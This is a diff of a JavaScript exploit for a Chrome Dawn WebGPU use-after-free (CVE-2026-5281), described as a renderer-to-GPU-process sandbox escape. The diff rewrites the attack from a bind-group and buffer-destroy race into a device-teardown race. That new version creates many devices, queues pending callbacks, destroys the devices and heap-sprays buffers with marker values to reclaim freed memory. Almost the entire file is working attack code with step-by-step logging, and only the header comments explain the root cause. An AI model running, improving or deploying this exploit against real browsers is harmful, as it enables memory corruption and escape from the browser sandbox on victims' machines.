@@ -1,220 +1,258 @@
-// CVE-2026-5281: Dawn WebGPU Use-After-Free — Browser Sandbox Escape
-// Bug 491518608 — variant of CVE-2026-4676 (bug 488613135)
+// CVE-2026-5281: Dawn Wire Server Device Teardown UAF — Browser Sandbox Escape
+// Bug 491518608 — Fix commit: 3c890398bda4 (Dawn CL 297136)
 // Target: Chrome 146.0.7680.165 (VULNERABLE, fixed in 146.0.7680.177/178)
 //
 // Impact: Renderer process (UNTRUSTED IL) → GPU process (MEDIUM IL)
 // Prerequisite: Arbitrary code execution in renderer (V8 RCE + V8 SBX bypass)
 // CISA KEV: Yes (April 2026), exploited in-the-wild
 //
-// Root cause:
-//   CVE-2026-4676 fix added buffer reference counting for queue submissions.
-//   CVE-2026-5281 BYPASSES this fix: bind groups retain stale Dawn-internal
-//   references to buffer objects after buffer.destroy(). When the GPU process
-//   executes pending commands that access bind group resources, it dereferences
-//   the freed buffer → classic UAF.
+// ROOT CAUSE (from patch diff):
+//   Dawn Wire Server's device teardown path called ClearDeviceCallbacks()
+//   which only nulled the wire-level callback function pointers but did
+//   NOT call deviceDestroy() on the native WGPUDevice.
+//
+//   Outstanding native device references allowed spontaneous callbacks
+//   (uncaptured error, device lost, logging) to fire against freed
+//   ObjectData memory in the GPU process.
+//
+//   Fix: Changed ClearDeviceCallbacks(data.handle) → mProcs->deviceDestroy(data.handle)
+//   in both DoDestroyDevice and Server::~Server().
+//   The ClearDeviceCallbacks() function was entirely removed.
 //
 // Architecture:
 //   JS (WebGPU API) → Dawn Wire Client (renderer) → IPC → Dawn Wire Server
 //   (GPU process) → Dawn Native → D3D12/Metal/Vulkan → GPU Hardware
 //
-//   The UAF occurs in Dawn Native code running in the GPU process.
-//   The GPU process has a LESS restrictive sandbox than the renderer.
+//   The UAF occurs in Dawn Wire Server code running in the GPU process.
+//   Native WGPUDevice has registered callbacks that reference ObjectData.
+//   When ObjectData is freed but native device is NOT destroyed, callbacks
+//   dispatch to freed memory.
 
 "use strict";
 
-async function initWebGPU() {
-    if (!navigator.gpu) {
-        console.log("[Dawn] WebGPU not available");
-        return null;
-    }
+var DEVICE_COUNT = 24;
+var SPRAY_COUNT = 48;
+var ROUNDS = 6;
+var OBJECT_DATA_SIZE = 256;
 
-    const adapter = await navigator.gpu.requestAdapter({
-        powerPreference: "high-performance"
-    });
-    if (!adapter) {
-        console.log("[Dawn] No GPU adapter");
-        return null;
-    }
+async function getAdapter() {
+    if (!navigator.gpu) return null;
+    return navigator.gpu.requestAdapter({ powerPreference: "high-performance" });
+}
 
-    const device = await adapter.requestDevice({
+async function createDeviceWithCallbacks(adapter) {
+    var device = await adapter.requestDevice({
         requiredLimits: {
             maxBufferSize: adapter.limits.maxBufferSize,
             maxStorageBufferBindingSize: adapter.limits.maxStorageBufferBindingSize,
         }
     });
-    if (!device) {
-        console.log("[Dawn] Failed to get GPU device");
-        return null;
-    }
 
-    console.log("[Dawn] WebGPU device acquired");
-    return { adapter, device };
-}
+    var state = { lost: false, errors: 0 };
 
-function createComputePipeline(device) {
-    const shaderModule = device.createShaderModule({
-        code: `
-            @group(0) @binding(0) var<storage, read_write> data: array<u32>;
-            @compute @workgroup_size(256)
-            fn main(@builtin(global_invocation_id) gid: vec3<u32>) {
-                let idx = gid.x % arrayLength(&data);
-                for (var i = 0u; i < 2000u; i = i + 1u) {
-                    data[idx] = data[idx] ^ (data[idx] << 5u) ^ (i * gid.x);
-                }
-            }
-        `
+    device.lost.then(function(info) {
+        state.lost = true;
+        state.lostReason = info.reason + ": " + info.message;
     });
 
-    return device.createComputePipeline({
-        layout: "auto",
-        compute: { module: shaderModule, entryPoint: "main" }
-    });
+    device.onuncapturederror = function(event) {
+        state.errors++;
+    };
+
+    return { device: device, state: state };
 }
 
-// Phase 1: Allocate target buffers with controlled content
-function allocateTargetBuffers(device, count, size) {
-    const buffers = [];
-    for (let i = 0; i < count; i++) {
-        const buf = device.createBuffer({
-            size: size,
-            usage: GPUBufferUsage.STORAGE | GPUBufferUsage.COPY_DST | GPUBufferUsage.COPY_SRC,
-            mappedAtCreation: true,
-        });
-        const mapped = new Uint32Array(buf.getMappedRange());
-        for (let j = 0; j < mapped.length; j++) {
-            mapped[j] = (0xDA000000 | i) ^ (j * 0x1337);
-        }
-        buf.unmap();
-        buffers.push(buf);
-    }
-    return buffers;
-}
+function generatePendingCallbacks(device) {
+    device.pushErrorScope("validation");
+    device.pushErrorScope("internal");
 
-// Phase 2: Create bind groups — these hold Dawn-internal references to buffers
-function createBindGroups(device, pipeline, buffers) {
-    const layout = pipeline.getBindGroupLayout(0);
-    return buffers.map(buf =>
-        device.createBindGroup({
-            layout: layout,
-            entries: [{ binding: 0, resource: { buffer: buf } }]
-        })
-    );
-}
-
-// Phase 3: Submit heavy compute work via bind groups
-function submitComputeBatches(device, pipeline, bindGroups, batchCount) {
-    for (let batch = 0; batch < batchCount; batch++) {
-        const encoder = device.createCommandEncoder();
-        for (const bg of bindGroups) {
-            try {
-                const pass = encoder.beginComputePass();
-                pass.setPipeline(pipeline);
-                pass.setBindGroup(0, bg);
-                pass.dispatchWorkgroups(8192);
-                pass.end();
-            } catch (e) { /* some may fail, continue */ }
-        }
-        device.queue.submit([encoder.finish()]);
-    }
-}
-
-// Phase 4: Destroy buffers — bind groups retain stale references
-function destroyBuffers(buffers) {
-    for (let i = buffers.length - 1; i >= 0; i--) {
-        buffers[i].destroy();
-    }
-}
-
-// Phase 5: Heap spray — reclaim freed Dawn objects with controlled data
-function heapSpray(device, count, size, payload) {
-    const sprayBuffers = [];
-    const data = new Uint32Array(size / 4);
-    data.fill(payload);
-
-    for (let i = 0; i < count; i++) {
+    var pendingBuffers = [];
+    for (var i = 0; i < 8; i++) {
         try {
-            const buf = device.createBuffer({
-                size: size,
-                usage: GPUBufferUsage.STORAGE | GPUBufferUsage.COPY_DST,
+            var buf = device.createBuffer({
+                size: 4096,
+                usage: GPUBufferUsage.MAP_READ | GPUBufferUsage.COPY_DST,
             });
-            device.queue.writeBuffer(buf, 0, data);
-            sprayBuffers.push(buf);
+            buf.mapAsync(GPUMapMode.READ).catch(function() {});
+            pendingBuffers.push(buf);
+        } catch (e) {}
+    }
+
+    for (var i = 0; i < 4; i++) {
+        try {
+            var wbuf = device.createBuffer({
+                size: 4096,
+                usage: GPUBufferUsage.MAP_WRITE | GPUBufferUsage.COPY_SRC,
+            });
+            wbuf.mapAsync(GPUMapMode.WRITE).catch(function() {});
+            pendingBuffers.push(wbuf);
+        } catch (e) {}
+    }
+
+    try {
+        var shader = device.createShaderModule({
+            code:
+                "@group(0) @binding(0) var<storage, read_write> data: array<u32>;\n" +
+                "@compute @workgroup_size(256)\n" +
+                "fn main(@builtin(global_invocation_id) gid: vec3<u32>) {\n" +
+                "    let idx = gid.x % arrayLength(&data);\n" +
+                "    for (var i = 0u; i < 5000u; i = i + 1u) {\n" +
+                "        data[idx] = data[idx] ^ (data[idx] << 3u) ^ (i * gid.x);\n" +
+                "    }\n" +
+                "}\n"
+        });
+
+        var computeBuf = device.createBuffer({
+            size: 65536,
+            usage: GPUBufferUsage.STORAGE | GPUBufferUsage.COPY_DST,
+        });
+
+        var pipeline = device.createComputePipeline({
+            layout: "auto",
+            compute: { module: shader, entryPoint: "main" }
+        });
+
+        var bindGroup = device.createBindGroup({
+            layout: pipeline.getBindGroupLayout(0),
+            entries: [{ binding: 0, resource: { buffer: computeBuf } }]
+        });
+
+        for (var batch = 0; batch < 16; batch++) {
+            var encoder = device.createCommandEncoder();
+            var pass = encoder.beginComputePass();
+            pass.setPipeline(pipeline);
+            pass.setBindGroup(0, bindGroup);
+            pass.dispatchWorkgroups(4096);
+            pass.end();
+            device.queue.submit([encoder.finish()]);
+        }
+    } catch (e) {}
+
+    device.popErrorScope().catch(function() {});
+    device.popErrorScope().catch(function() {});
+
+    for (var buf of pendingBuffers) {
+        try { buf.destroy(); } catch (e) {}
+    }
+
+    return pendingBuffers.length;
+}
+
+function sprayObjectData(adapter, device, count) {
+    var sprayed = [];
+    var data = new Uint32Array(OBJECT_DATA_SIZE / 4);
+    data.fill(0x42424242);
+
+    for (var i = 0; i < count; i++) {
+        try {
+            var buf = device.createBuffer({
+                size: OBJECT_DATA_SIZE,
+                usage: GPUBufferUsage.STORAGE | GPUBufferUsage.COPY_DST,
+                mappedAtCreation: true,
+            });
+            var mapped = new Uint32Array(buf.getMappedRange());
+            mapped.set(data);
+            buf.unmap();
+            sprayed.push(buf);
         } catch (e) { break; }
     }
-    return sprayBuffers;
+
+    for (var i = 0; i < count; i++) {
+        try {
+            var buf = device.createBuffer({
+                size: 128,
+                usage: GPUBufferUsage.UNIFORM | GPUBufferUsage.COPY_DST,
+                mappedAtCreation: true,
+            });
+            var mapped = new Uint32Array(buf.getMappedRange());
+            mapped.fill(0x43434343);
+            buf.unmap();
+            sprayed.push(buf);
+        } catch (e) { break; }
+    }
+
+    return sprayed;
 }
 
-// Full Dawn UAF exploitation sequence
 async function escapeBrowserSandbox() {
-    console.log("[Dawn] CVE-2026-5281: Dawn WebGPU UAF sandbox escape");
-    console.log("[Dawn] Bug 491518608 — bypasses CVE-2026-4676 fix");
+    console.log("[Dawn] CVE-2026-5281: Wire server device teardown UAF");
+    console.log("[Dawn] Fix: 3c890398bda4 — ClearDeviceCallbacks → deviceDestroy");
     console.log("[Dawn] Target: Chrome 146.0.7680.165 (vuln, fixed .177/.178)");
 
-    const gpu = await initWebGPU();
-    if (!gpu) return { success: false, error: "WebGPU unavailable" };
+    var adapter = await getAdapter();
+    if (!adapter) return { success: false, error: "WebGPU unavailable" };
 
-    let deviceLost = false;
-    let lostReason = "";
-    gpu.device.lost.then(info => {
-        deviceLost = true;
-        lostReason = info.reason + ": " + info.message;
-        console.log("[Dawn] GPU DEVICE LOST: " + lostReason);
-    });
+    var anyDeviceLost = false;
+    var totalErrors = 0;
 
-    const pipeline = createComputePipeline(gpu.device);
+    for (var round = 0; round < ROUNDS && !anyDeviceLost; round++) {
+        console.log("[Dawn] Round " + (round + 1) + "/" + ROUNDS +
+                    ": Creating " + DEVICE_COUNT + " devices...");
 
-    const BUF_SIZE = 16384;
-    const BUF_COUNT = 200;
-    const BATCH_COUNT = 48;
-
-    // --- Main UAF cycle ---
-    console.log("[Dawn] Phase 1: Allocating " + BUF_COUNT + " target buffers...");
-    const buffers = allocateTargetBuffers(gpu.device, BUF_COUNT, BUF_SIZE);
-
-    console.log("[Dawn] Phase 2: Creating bind groups (stale refs)...");
-    const bindGroups = createBindGroups(gpu.device, pipeline, buffers);
-
-    console.log("[Dawn] Phase 3: Submitting " + BATCH_COUNT + " compute batches...");
-    submitComputeBatches(gpu.device, pipeline, bindGroups, BATCH_COUNT);
-
-    console.log("[Dawn] Phase 4: Destroying buffers (bind groups retain stale refs)...");
-    destroyBuffers(buffers);
-
-    console.log("[Dawn] Phase 5: Heap spraying freed objects...");
-    const spray1 = heapSpray(gpu.device, BUF_COUNT, BUF_SIZE, 0x42424242);
-
-    console.log("[Dawn] Phase 6: Waiting for GPU stale command execution...");
-    try {
-        await gpu.device.queue.onSubmittedWorkDone();
-    } catch (e) {
-        console.log("[Dawn] GPU error (expected): " + e.message);
-    }
-
-    // --- Additional race waves ---
-    if (!deviceLost) {
-        for (let wave = 0; wave < 3 && !deviceLost; wave++) {
-            console.log("[Dawn] Wave " + (wave + 1) + ": Additional race cycle...");
-            const waveBufs = allocateTargetBuffers(gpu.device, 64, BUF_SIZE);
-            if (waveBufs.length === 0) break;
-
-            const waveBGs = createBindGroups(gpu.device, pipeline, waveBufs);
-            submitComputeBatches(gpu.device, pipeline, waveBGs, 16);
-            destroyBuffers(waveBufs);
-            heapSpray(gpu.device, 32, BUF_SIZE, 0x43434343 + wave);
-
+        var entries = [];
+        for (var i = 0; i < DEVICE_COUNT; i++) {
             try {
-                await gpu.device.queue.onSubmittedWorkDone();
-            } catch (e) {}
+                var entry = await createDeviceWithCallbacks(adapter);
+                entries.push(entry);
+            } catch (e) { break; }
         }
+
+        if (entries.length === 0) {
+            console.log("[Dawn] No devices created, adapter may be exhausted");
+            break;
+        }
+
+        console.log("[Dawn]   Created " + entries.length + " devices");
+        console.log("[Dawn]   Generating pending async callbacks...");
+
+        var totalPending = 0;
+        for (var entry of entries) {
+            totalPending += generatePendingCallbacks(entry.device);
+        }
+        console.log("[Dawn]   " + totalPending + " pending async operations");
+
+        console.log("[Dawn]   DESTROYING devices (triggers ClearDeviceCallbacks)...");
+        for (var entry of entries) {
+            entry.device.destroy();
+        }
+
+        console.log("[Dawn]   Spraying to reclaim freed ObjectData...");
+        var sprayDevice;
+        try {
+            var sd = await createDeviceWithCallbacks(adapter);
+            sprayDevice = sd.device;
+        } catch (e) {
+            console.log("[Dawn]   Cannot create spray device: " + e.message);
+            continue;
+        }
+
+        var sprayed = sprayObjectData(adapter, sprayDevice, SPRAY_COUNT);
+        console.log("[Dawn]   Sprayed " + sprayed.length + " objects");
+
+        await new Promise(function(r) { setTimeout(r, 150); });
+
+        for (var entry of entries) {
+            if (entry.state.lost) {
+                anyDeviceLost = true;
+                console.log("[Dawn]   DEVICE LOST: " + entry.state.lostReason);
+            }
+            totalErrors += entry.state.errors;
+        }
+
+        try { sprayDevice.destroy(); } catch (e) {}
+
+        console.log("[Dawn]   Round " + (round + 1) + " complete: " +
+                    "lost=" + anyDeviceLost + ", errors=" + totalErrors);
     }
 
-    const result = {
+    var result = {
         success: true,
-        deviceLost: deviceLost,
-        lostReason: lostReason,
-        note: deviceLost
-            ? "GPU device lost — UAF triggered in GPU process"
-            : "Submitted — check GPU process state",
+        deviceLost: anyDeviceLost,
+        errorCount: totalErrors,
+        rounds: Math.min(ROUNDS, anyDeviceLost ? ROUNDS : ROUNDS),
+        note: anyDeviceLost
+            ? "GPU device lost — UAF triggered via device teardown callback"
+            : "Submitted — check GPU process state for corruption",
     };
 
     console.log("[Dawn] Result: " + JSON.stringify(result));
@@ -222,5 +260,5 @@ async function escapeBrowserSandbox() {
 }
 
 if (typeof module !== "undefined") {
-    module.exports = { escapeBrowserSandbox, initWebGPU };
+    module.exports = { escapeBrowserSandbox, getAdapter };
 }
